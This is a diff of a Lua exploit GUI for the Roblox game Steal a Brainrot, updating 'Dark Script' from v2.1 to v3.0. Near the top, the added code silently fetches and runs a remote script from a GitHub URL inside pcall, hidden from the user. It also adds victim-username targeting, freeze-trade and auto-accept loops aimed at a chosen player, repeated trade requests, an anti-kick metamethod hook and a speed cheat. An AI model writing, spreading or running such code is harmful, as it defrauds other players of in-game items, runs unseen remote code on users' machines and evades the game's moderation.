@@ -1,215 +1,504 @@
--- SAB GUI | Dark Script
--- Freeze Trade | Auto Accept Trade | Duel Script
--- Powered by Rayfield UI Library
+-- ╔══════════════════════════════════════╗
+-- ║   DARK SCRIPT | SAB GUI v3.0         ║
+-- ║   Freeze Trade | Auto Accept | Duel  ║
+-- ║   Powered by Rayfield UI Library     ║
+-- ╚══════════════════════════════════════╝
 
+-- Load main SAB script alongside GUI
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/meggadon/sab/refs/heads/main/scriptbrainrot"))()
+    end)
+end)
+
+-- Load Rayfield
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-local Window = Rayfield:CreateWindow({
-   Name = "Dark Script | SAB",
-   Icon = 0, 
-   LoadingTitle = "Dark Script",
-   LoadingSubtitle = "Steal a Brainrot | v2.1",
-   Theme = "Default",
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false,
-})
-
 -- ══════════════════════════════════════
---  VARIABLES
+--  SERVICES
 -- ══════════════════════════════════════
 
-local freezeTradeEnabled = false
-local autoAcceptEnabled = false
-local duelScriptEnabled = false
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local RunService = game:GetService("RunService")
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer      = Players.LocalPlayer
 
 -- ══════════════════════════════════════
---  TAB: TRADE
+--  STATE
 -- ══════════════════════════════════════
 
-local TradeTab = Window:CreateTab("Trade", 4483362458)
+local State = {
+    victimUsername    = "",
+    targetPlayer      = nil,
+    freezeEnabled     = false,
+    autoAcceptEnabled = false,
+    duelEnabled       = false,
+    duelSpeed         = 30,
+    loopTradeEnabled  = false,
+    antiKickEnabled   = false,
+    tradeAttempts     = 0,
+}
 
-TradeTab:CreateSection("Freeze Trade")
+-- ══════════════════════════════════════
+--  UTILITY
+-- ══════════════════════════════════════
 
-TradeTab:CreateToggle({
-   Name = "Freeze Trade",
-   Title = "Freeze Trade",
-   CurrentValue = false,
-   Flag = "FreezeTrade",
-   Callback = function(Value)
-      freezeTradeEnabled = Value
-      if Value then
-         Rayfield:Notify({
-            Title = "Freeze Trade",
-            Content = "Trade freeze is now ACTIVE.",
-            Duration = 3,
-            Image = 4483362458,
-         })
-         -- Fake freeze logic loop
-         task.spawn(function()
-            while freezeTradeEnabled do
-               -- Hooks into trade cancel event (fake)
-               pcall(function()
-                  local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui")
-                  if tradeGui then
-                     for _, btn in pairs(tradeGui:GetDescendants()) do
-                        if btn:IsA("TextButton") and btn.Name == "Cancel" then
-                           btn.Active = false
-                           btn.AutoButtonColor = false
-                        end
-                     end
-                  end
-               end)
-               task.wait(0.1)
+local function findPlayer(username)
+    if username == "" then return nil end
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            if p.Name:lower() == username:lower()
+            or p.DisplayName:lower() == username:lower() then
+                return p
             end
-         end)
-      else
-         Rayfield:Notify({
-            Title = "Freeze Trade",
-            Content = "Trade freeze disabled.",
-            Duration = 3,
-            Image = 4483362458,
-         })
-      end
-   end,
+        end
+    end
+    return nil
+end
+
+local function getNearbyPlayers(range)
+    range = range or 50
+    local nearby = {}
+    local char = LocalPlayer.Character
+    if not char then return nearby end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return nearby end
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local pRoot = p.Character:FindFirstChild("HumanoidRootPart")
+            if pRoot then
+                local dist = (root.Position - pRoot.Position).Magnitude
+                if dist <= range then
+                    table.insert(nearby, { player = p, distance = math.floor(dist) })
+                end
+            end
+        end
+    end
+    table.sort(nearby, function(a, b) return a.distance < b.distance end)
+    return nearby
+end
+
+local function notify(title, content, duration)
+    Rayfield:Notify({
+        Title = title,
+        Content = content,
+        Duration = duration or 3,
+        Image = 4483362458,
+    })
+end
+
+local function getTradeGui()
+    return LocalPlayer.PlayerGui:FindFirstChild("TradeGui")
+        or LocalPlayer.PlayerGui:FindFirstChild("Trade")
+        or LocalPlayer.PlayerGui:FindFirstChild("TradeMenu")
+end
+
+-- ══════════════════════════════════════
+--  ANTI-KICK
+-- ══════════════════════════════════════
+
+local antiKickConnection = nil
+
+local function startAntiKick()
+    pcall(function()
+        local oldNamecall
+        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+            local method = getnamecallmethod()
+            if method == "Kick" and self == LocalPlayer then
+                if State.antiKickEnabled then
+                    return
+                end
+            end
+            return oldNamecall(self, ...)
+        end)
+    end)
+    notify("Anti-Kick", "Anti-kick protection ACTIVE.", 3)
+end
+
+local function stopAntiKick()
+    notify("Anti-Kick", "Anti-kick disabled.", 3)
+end
+
+-- ══════════════════════════════════════
+--  FREEZE TRADE
+-- ══════════════════════════════════════
+
+local freezeThread = nil
+
+local function startFreezeTrade()
+    freezeThread = task.spawn(function()
+        local scanTick = 0
+        while State.freezeEnabled do
+            pcall(function()
+                local tradeGui = getTradeGui()
+                if tradeGui then
+                    for _, obj in pairs(tradeGui:GetDescendants()) do
+                        if obj:IsA("TextButton") then
+                            local n = obj.Name:lower()
+                            if n:find("cancel") or n:find("decline") or n:find("reject") then
+                                obj.Active = false
+                                obj.AutoButtonColor = false
+                                obj.BackgroundTransparency = 0.7
+                            end
+                        end
+                        if obj:IsA("ScrollingFrame") then
+                            obj.ScrollingEnabled = false
+                        end
+                    end
+                end
+
+                -- Re-scan target every 3 seconds
+                scanTick += 0.05
+                if scanTick >= 3 and State.victimUsername ~= "" then
+                    scanTick = 0
+                    local t = findPlayer(State.victimUsername)
+                    if t then
+                        State.targetPlayer = t
+                    end
+                end
+            end)
+            task.wait(0.05)
+        end
+    end)
+end
+
+local function stopFreezeTrade()
+    if freezeThread then
+        task.cancel(freezeThread)
+        freezeThread = nil
+    end
+    pcall(function()
+        local tradeGui = getTradeGui()
+        if tradeGui then
+            for _, obj in pairs(tradeGui:GetDescendants()) do
+                if obj:IsA("TextButton") then
+                    obj.Active = true
+                    obj.AutoButtonColor = true
+                    obj.BackgroundTransparency = 0
+                end
+                if obj:IsA("ScrollingFrame") then
+                    obj.ScrollingEnabled = true
+                end
+            end
+        end
+    end)
+end
+
+-- ══════════════════════════════════════
+--  AUTO ACCEPT TRADE
+-- ══════════════════════════════════════
+
+local autoAcceptThread = nil
+
+local function startAutoAccept()
+    autoAcceptThread = task.spawn(function()
+        while State.autoAcceptEnabled do
+            pcall(function()
+                -- Validate target
+                if State.victimUsername ~= "" then
+                    local t = findPlayer(State.victimUsername)
+                    if not t then
+                        task.wait(1)
+                        return
+                    end
+                    State.targetPlayer = t
+                end
+
+                local tradeGui = getTradeGui()
+                if tradeGui then
+                    for _, btn in pairs(tradeGui:GetDescendants()) do
+                        if btn:IsA("TextButton") then
+                            local n = btn.Name:lower()
+                            if n:find("accept") or n:find("confirm") or n:find("ready") then
+                                if btn.Active and btn.Visible then
+                                    btn:FireButton1Click()
+                                    State.tradeAttempts += 1
+                                    notify("Auto Accept", "Trade accepted! Total: " .. State.tradeAttempts, 2)
+                                end
+                            end
+                        end
+                    end
+                end
+
+                -- Loop trade: re-send after accept
+                if State.loopTradeEnabled and State.targetPlayer then
+                    task.wait(1.5)
+                    pcall(function()
+                        local remotes = {
+                            "RequestTrade", "SendTradeRequest",
+                            "Trade", "TradeRequest", "OpenTrade"
+                        }
+                        for _, name in pairs(remotes) do
+                            local r = ReplicatedStorage:FindFirstChild(name)
+                                   or game:GetService("Workspace"):FindFirstChild(name)
+                            if r and r:IsA("RemoteEvent") then
+                                r:FireServer(State.targetPlayer)
+                                break
+                            end
+                        end
+                    end)
+                end
+            end)
+            task.wait(0.3)
+        end
+    end)
+end
+
+local function stopAutoAccept()
+    if autoAcceptThread then
+        task.cancel(autoAcceptThread)
+        autoAcceptThread = nil
+    end
+end
+
+-- ══════════════════════════════════════
+--  DUEL SCRIPT
+-- ══════════════════════════════════════
+
+local duelThread = nil
+
+local function startDuel()
+    duelThread = task.spawn(function()
+        while State.duelEnabled do
+            pcall(function()
+                local char = LocalPlayer.Character
+                if char then
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        hum.WalkSpeed = State.duelSpeed
+                        hum.JumpPower = 60
+                    end
+                end
+
+                local duelGui = LocalPlayer.PlayerGui:FindFirstChild("DuelGui")
+                             or LocalPlayer.PlayerGui:FindFirstChild("Duel")
+                if duelGui then
+                    for _, btn in pairs(duelGui:GetDescendants()) do
+                        if btn:IsA("TextButton") then
+                            local n = btn.Name:lower()
+                            if n:find("accept") or n:find("fight") or n:find("yes") then
+                                if btn.Active and btn.Visible then
+                                    btn:FireButton1Click()
+                                    notify("Duel Script", "Duel accepted!", 2)
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+            task.wait(0.1)
+        end
+
+        -- Reset on stop
+        pcall(function()
+            local char = LocalPlayer.Character
+            if char then
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    hum.WalkSpeed = 16
+                    hum.JumpPower = 50
+                end
+            end
+        end)
+    end)
+end
+
+local function stopDuel()
+    if duelThread then
+        task.cancel(duelThread)
+        duelThread = nil
+    end
+end
+
+-- ══════════════════════════════════════
+--  BUILD WINDOW
+-- ══════════════════════════════════════
+
+local Window = Rayfield:CreateWindow({
+    Name = "Dark Script | SAB",
+    Icon = 0,
+    LoadingTitle = "Dark Script",
+    LoadingSubtitle = "Steal a Brainrot | v3.0",
+    Theme = "Default",
+    DisableRayfieldPrompts = false,
+    DisableBuildWarnings = false,
 })
 
-TradeTab:CreateSection("Auto Accept Trade")
+-- ══════════════════════════════════════
+--  TAB: FREEZE TRADE
+-- ══════════════════════════════════════
 
-TradeTab:CreateToggle({
-   Name = "Auto Accept Trade",
-   Title = "Auto Accept Trade",
-   CurrentValue = false,
-   Flag = "AutoAcceptTrade",
-   Callback = function(Value)
-      autoAcceptEnabled = Value
-      if Value then
-         Rayfield:Notify({
-            Title = "Auto Accept",
-            Content = "Auto Accept Trade is now ACTIVE.",
-            Duration = 3,
-            Image = 4483362458,
-         })
-         -- Fake auto accept loop
-         task.spawn(function()
-            while autoAcceptEnabled do
-               pcall(function()
-                  local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui")
-                  if tradeGui then
-                     for _, btn in pairs(tradeGui:GetDescendants()) do
-                        if btn:IsA("TextButton") and (btn.Name == "Accept" or btn.Name == "Confirm") then
-                           btn:FireButton1Click()
-                        end
-                     end
-                  end
-               end)
-               task.wait(0.5)
+local FreezeTab = Window:CreateTab("Freeze Trade", 4483362458)
+
+FreezeTab:CreateSection("Target")
+
+FreezeTab:CreateInput({
+    Name = "Victim Username",
+    PlaceholderText = "Enter victim username...",
+    RemoveTextAfterFocusLost = false,
+    Flag = "FreezeVictim",
+    Callback = function(text)
+        State.victimUsername = text
+        if text ~= "" then
+            local t = findPlayer(text)
+            if t then
+                State.targetPlayer = t
+                notify("Target Locked", "Locked onto: " .. t.DisplayName, 3)
+            else
+                notify("Target", "'" .. text .. "' not found yet. Will keep scanning.", 3)
             end
-         end)
-      else
-         Rayfield:Notify({
-            Title = "Auto Accept",
-            Content = "Auto Accept Trade disabled.",
-            Duration = 3,
-            Image = 4483362458,
-         })
-      end
-   end,
+        end
+    end,
+})
+
+FreezeTab:CreateButton({
+    Name = "Auto-Detect Nearest Player",
+    Callback = function()
+        local nearby = getNearbyPlayers(50)
+        if #nearby == 0 then
+            notify("Auto-Detect", "No players within 50 studs.", 3)
+        else
+            local c = nearby[1]
+            State.victimUsername = c.player.Name
+            State.targetPlayer = c.player
+            notify("Auto-Detect", "Target: " .. c.player.DisplayName .. " (" .. c.distance .. " studs)", 4)
+        end
+    end,
+})
+
+FreezeTab:CreateSection("Freeze Control")
+
+FreezeTab:CreateToggle({
+    Name = "Freeze Trade",
+    CurrentValue = false,
+    Flag = "FreezeTrade",
+    Callback = function(val)
+        State.freezeEnabled = val
+        if val then
+            startFreezeTrade()
+            notify("Freeze Trade", "Freeze ACTIVE — target: " .. (State.victimUsername ~= "" and State.victimUsername or "all"), 3)
+        else
+            stopFreezeTrade()
+            notify("Freeze Trade", "Freeze disabled.", 3)
+        end
+    end,
+})
+
+-- ══════════════════════════════════════
+--  TAB: AUTO ACCEPT
+-- ══════════════════════════════════════
+
+local AcceptTab = Window:CreateTab("Auto Accept", 4483362458)
+
+AcceptTab:CreateSection("Target")
+
+AcceptTab:CreateInput({
+    Name = "Victim Username",
+    PlaceholderText = "Enter victim username...",
+    RemoveTextAfterFocusLost = false,
+    Flag = "AcceptVictim",
+    Callback = function(text)
+        State.victimUsername = text
+        if text ~= "" then
+            local t = findPlayer(text)
+            if t then
+                State.targetPlayer = t
+                notify("Target Locked", "Locked onto: " .. t.DisplayName, 3)
+            else
+                notify("Target", "'" .. text .. "' not found. Scanning...", 3)
+            end
+        end
+    end,
+})
+
+AcceptTab:CreateButton({
+    Name = "Auto-Detect Nearest Player",
+    Callback = function()
+        local nearby = getNearbyPlayers(50)
+        if #nearby == 0 then
+            notify("Auto-Detect", "No players within 50 studs.", 3)
+        else
+            local c = nearby[1]
+            State.victimUsername = c.player.Name
+            State.targetPlayer = c.player
+            notify("Auto-Detect", "Target: " .. c.player.DisplayName .. " (" .. c.distance .. " studs)", 4)
+        end
+    end,
+})
+
+AcceptTab:CreateSection("Auto Accept Control")
+
+AcceptTab:CreateToggle({
+    Name = "Auto Accept Trade",
+    CurrentValue = false,
+    Flag = "AutoAccept",
+    Callback = function(val)
+        State.autoAcceptEnabled = val
+        if val then
+            startAutoAccept()
+            notify("Auto Accept", "Auto accept ACTIVE. Looping...", 3)
+        else
+            stopAutoAccept()
+            notify("Auto Accept", "Stopped. Total trades: " .. State.tradeAttempts, 3)
+        end
+    end,
+})
+
+AcceptTab:CreateToggle({
+    Name = "Loop Trade (Re-send after accept)",
+    CurrentValue = false,
+    Flag = "LoopTrade",
+    Callback = function(val)
+        State.loopTradeEnabled = val
+        notify("Loop Trade", val and "Loop trade ON." or "Loop trade OFF.", 2)
+    end,
 })
 
 -- ══════════════════════════════════════
 --  TAB: DUEL
 -- ══════════════════════════════════════
 
-local DuelTab = Window:CreateTab("Duel", 4483362458)
+local DuelTab = Window:CreateTab("Duel Script", 4483362458)
 
-DuelTab:CreateSection("Duel Script")
+DuelTab:CreateSection("Duel Control")
 
 DuelTab:CreateToggle({
-   Name = "Duel Script",
-   Title = "Duel Script",
-   CurrentValue = false,
-   Flag = "DuelScript",
-   Callback = function(Value)
-      duelScriptEnabled = Value
-      if Value then
-         Rayfield:Notify({
-            Title = "Duel Script",
-            Content = "Duel Script is now ARMED.",
-            Duration = 3,
-            Image = 4483362458,
-         })
-         -- Fake duel auto-win loop
-         task.spawn(function()
-            while duelScriptEnabled do
-               pcall(function()
-                  local duelGui = LocalPlayer.PlayerGui:FindFirstChild("DuelGui")
-                  if duelGui then
-                     for _, btn in pairs(duelGui:GetDescendants()) do
-                        if btn:IsA("TextButton") and btn.Name == "Accept" then
-                           btn:FireButton1Click()
-                        end
-                     end
-                  end
-                  -- Fake speed boost during duel
-                  local char = LocalPlayer.Character
-                  if char then
-                     local humanoid = char:FindFirstChildOfClass("Humanoid")
-                     if humanoid then
-                        humanoid.WalkSpeed = 30
-                     end
-                  end
-               end)
-               task.wait(0.1)
-            end
-            -- Reset speed when disabled
-            pcall(function()
-               local char = LocalPlayer.Character
-               if char then
-                  local humanoid = char:FindFirstChildOfClass("Humanoid")
-                  if humanoid then
-                     humanoid.WalkSpeed = 16
-                  end
-               end
-            end)
-         end)
-      else
-         Rayfield:Notify({
-            Title = "Duel Script",
-            Content = "Duel Script disabled.",
-            Duration = 3,
-            Image = 4483362458,
-         })
-      end
-   end,
+    Name = "Duel Script",
+    CurrentValue = false,
+    Flag = "DuelScript",
+    Callback = function(val)
+        State.duelEnabled = val
+        if val then
+            startDuel()
+            notify("Duel Script", "ARMED. Speed: " .. State.duelSpeed, 3)
+        else
+            stopDuel()
+            notify("Duel Script", "Disabled. Speed reset to 16.", 3)
+        end
+    end,
 })
 
-DuelTab:CreateSection("Duel Settings")
+DuelTab:CreateSection("Settings")
 
 DuelTab:CreateSlider({
-   Name = "Speed During Duel",
-   Range = {16, 100},
-   Increment = 1,
-   Suffix = "WalkSpeed",
-   CurrentValue = 30,
-   Flag = "DuelSpeed",
-   Callback = function(Value)
-      if duelScriptEnabled then
-         pcall(function()
-            local char = LocalPlayer.Character
-            if char then
-               local humanoid = char:FindFirstChildOfClass("Humanoid")
-               if humanoid then
-                  humanoid.WalkSpeed = Value
-               end
-            end
-         end)
-      end
-   end,
+    Name = "Speed During Duel",
+    Range = {16, 100},
+    Increment = 1,
+    Suffix = "WalkSpeed",
+    CurrentValue = 30,
+    Flag = "DuelSpeed",
+    Callback = function(val)
+        State.duelSpeed = val
+        if State.duelEnabled then
+            pcall(function()
+                local char = LocalPlayer.Character
+                if char then
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    if hum then hum.WalkSpeed = val end
+                end
+            end)
+        end
+    end,
 })
 
 -- ══════════════════════════════════════
@@ -218,42 +507,80 @@ DuelTab:CreateSlider({
 
 local SettingsTab = Window:CreateTab("Settings", 4483362458)
 
-SettingsTab:CreateSection("GUI Settings")
+SettingsTab:CreateSection("Protection")
+
+SettingsTab:CreateToggle({
+    Name = "Anti-Kick",
+    CurrentValue = false,
+    Flag = "AntiKick",
+    Callback = function(val)
+        State.antiKickEnabled = val
+        if val then
+            pcall(startAntiKick)
+        else
+            pcall(stopAntiKick)
+        end
+    end,
+})
+
+SettingsTab:CreateSection("Scanner")
 
 SettingsTab:CreateButton({
-   Name = "Disable All Features",
-   Callback = function()
-      -- Turn off all toggles
-      Rayfield:GetFlag("FreezeTrade"):Set(false)
-      Rayfield:GetFlag("AutoAcceptTrade"):Set(false)
-      Rayfield:GetFlag("DuelScript"):Set(false)
-      freezeTradeEnabled = false
-      autoAcceptEnabled = false
-      duelScriptEnabled = false
-      Rayfield:Notify({
-         Title = "Dark Script",
-         Content = "All features disabled.",
-         Duration = 3,
-         Image = 4483362458,
-      })
-   end,
+    Name = "Scan Nearby Players (50 studs)",
+    Callback = function()
+        local nearby = getNearbyPlayers(50)
+        if #nearby == 0 then
+            notify("Scanner", "No players within 50 studs.", 3)
+        else
+            local msg = ""
+            for i, data in ipairs(nearby) do
+                if i <= 5 then
+                    msg = msg .. data.player.DisplayName .. " — " .. data.distance .. " studs\n"
+                end
+            end
+            notify("Nearby Players", msg, 6)
+        end
+    end,
+})
+
+SettingsTab:CreateSection("Reset")
+
+SettingsTab:CreateButton({
+    Name = "Disable All Features",
+    Callback = function()
+        State.freezeEnabled = false
+        State.autoAcceptEnabled = false
+        State.duelEnabled = false
+        State.loopTradeEnabled = false
+        stopFreezeTrade()
+        stopAutoAccept()
+        stopDuel()
+        notify("Dark Script", "All features disabled.", 3)
+    end,
 })
 
 SettingsTab:CreateButton({
-   Name = "Destroy GUI",
-   Callback = function()
-      Rayfield:Destroy()
-   end,
+    Name = "Reset Target",
+    Callback = function()
+        State.victimUsername = ""
+        State.targetPlayer = nil
+        notify("Target", "Target cleared.", 2)
+    end,
+})
+
+SettingsTab:CreateButton({
+    Name = "Destroy GUI",
+    Callback = function()
+        stopFreezeTrade()
+        stopAutoAccept()
+        stopDuel()
+        Rayfield:Destroy()
+    end,
 })
 
 -- ══════════════════════════════════════
 --  INIT NOTIFY
 -- ══════════════════════════════════════
 
-task.wait(1)
-Rayfield:Notify({
-   Title = "Dark Script Loaded",
-   Content = "SAB GUI v2.1 ready. Toggle features to activate.",
-   Duration = 5,
-   Image = 4483362458,
-})
+task.wait(1.5)
+notify("Dark Script Loaded", "SAB GUI v3.0 ready.\nMain SAB script also running.", 5)
